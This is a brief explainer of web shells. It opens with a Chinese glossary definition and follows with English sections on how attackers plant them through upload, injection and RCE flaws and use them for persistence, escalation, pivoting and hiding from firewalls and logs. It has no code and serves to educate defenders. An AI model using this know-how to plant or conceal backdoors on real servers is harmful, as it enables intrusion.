WebShell 就是以 ASP、PHP、JSP 或者 CGI 等网页文件形式的一种命令执行环境，也可以将其称做是一种网页后门。黑客在侵入了一个网站后，通常会将这些 ASP 或 PHP 后门文件与网站服务器 Web 目录下正常的网页文件混在一起，之后就可以使用浏览器来访问这些 ASP或者 PHP 后门，得到命令执行环境，以达到控制网站服务器的目的。可以上传下载文件、查看数据库、执行任意程序命令等。——《网络安全词汇术语汇编v8.0.3》

Web Shell

Web shells are malicious scripts that enable threat actors to compromise web servers and launch additional attacks. Threat actors first penetrate a system or network and then install a web shell. From this point onwards, they use it as a permanent backdoor into the targeted web applications and any connected systems.

How Web Shells Work

Web shell attacks have several stages: first, the attacker creates a persistent mechanism on the server enabling remote access. Then, they attempt to escalate privileges, and leverage the backdoor to attack the organization, or use its resources for criminal activity.

Using file upload vulnerability, SQL injection vulnerability, RCE vulnerability and so on, put malicious files into the Web server, which is often said to be the “back door”, and then can carry out file management, database management, remote command execution, rights and other malicious operations.

The common attack features of Webshell are as follows:

  • Persistent Remote Access

  • Privilege Escalation

  • Pivoting and Launching Attacks

  • Bot Herding

  • Extremely concealment

    Webshell can be nested within a normal web page and is not easy to kill. It can also through the server firewall, because with the control of the server or the remote host interaction data are passed through port 80, will therefore not be blocked by the firewall, in the case of no record flow, Webshell using post packages to send, will not be recorded in system log, will only record some data submitted in the Web log records.
